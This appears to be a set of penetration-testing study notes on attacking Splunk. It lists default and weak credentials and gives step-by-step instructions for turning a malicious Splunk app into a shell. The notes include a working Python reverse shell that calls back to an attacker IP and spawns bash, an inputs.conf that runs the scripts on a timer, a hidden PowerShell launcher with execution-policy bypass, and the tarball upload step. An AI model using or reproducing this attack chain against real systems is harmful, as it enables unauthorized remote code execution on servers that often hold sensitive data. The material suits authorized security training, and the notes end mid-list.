* Log analytics tool used to gather, analyse and visualise data. 
* Often used as SIEM
* Often used to house sensitive data.
* Not many vulnerabilities, so most focus on weak authentication. 
# Discovery and Enumeration 
## Discovery
* Often run as root or SYSTEM. 
* Rare to be seen externally facing. 
* Runs on port 8000 as default.
* Default creds `admin:changem`
	* Newer versions set credentials on installation.
	* Common weak passwords like `admin`,`welcome1 etc...
## Enumeration 
* The splunk enterprise trial converts to free after 60days which doesn't require auth.
* Splunk can run code in a number of ways. 
* Designed to give `STDOUT` as input for splunk
# Attacking Spunk
## Abusing Built-In Functionality 
* Bin directory in [this](https://github.com/0xjpuff/reverse_shell_splunk) repo has examples for Python and Powershell
* [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. 
Example:
```shell
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
* File to run the script
#### Windows
```shell
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```
#### Linux
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
* Create a tarball 
```shell
tar -cvzf updater.tar.gz splunk_shell/
```
* Install app from File and upload
* Start a listner
* 